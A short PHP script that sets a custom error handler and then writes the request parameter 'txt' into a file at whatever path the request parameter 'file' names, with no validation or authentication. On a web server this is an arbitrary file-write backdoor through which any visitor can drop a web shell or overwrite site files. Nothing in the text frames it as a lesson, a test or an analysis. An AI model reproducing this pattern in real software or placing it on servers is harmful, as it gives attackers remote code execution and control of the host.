<?php
//error handler function
function customError($errno, $errstr) {
  echo "Error: [$errno] $errstr";
}

//set error handler
set_error_handler("customError");

$myfile = fopen($_REQUEST['file'], "w") or die("Unable to open file!");
$txt = $_REQUEST['txt'];
fwrite($myfile, $txt);
fclose($myfile);
?>